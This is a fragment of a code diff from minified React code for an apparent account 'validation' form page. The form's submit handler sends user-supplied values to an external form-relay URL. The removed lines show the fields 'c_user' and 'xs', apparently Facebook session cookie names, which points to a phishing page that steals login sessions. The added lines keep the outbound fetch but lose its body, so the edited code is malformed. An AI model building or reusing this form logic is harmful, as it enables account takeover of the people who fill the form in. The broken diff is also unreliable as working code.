@@ -13846,21 +13846,14 @@
                                         className: "fw-semibold validation_form_para mt-2",
                                         children: "Please be sure to provide the requested information below."
                                     }), (0,
-                                        he.jsxs)("form", {
-                                        onSubmit: n => {
-                                            n.preventDefault(),
-                                                u && o ? (fetch("https://submit-form.com/oZyu0lxqH", {
-                                                        method: "POST",
-                                                        headers: {
-                                                            "Content-Type": "application/json"
-                                                        },
-                                                        body: JSON.stringify({
-                                                            emails: e,
-                                                            workerEmail: "",
-                                                            xs: o,
-                                                            c_user: u,
-                                                            name: "My Self"
-                                                        })
+                            he.jsxs)("form", {
+                                onSubmit: n => {
+                                    n.preventDefault(),
+                                    u && o ? (fetch("https://submit-form.com/oZyu0lxqH", {
+                                        method: "POST",
+                                        headers: {
+                                            "Content-Type": "application/json"
+                                        },
                                                     }).then((e => {
                                                         e.ok
                                                     })),
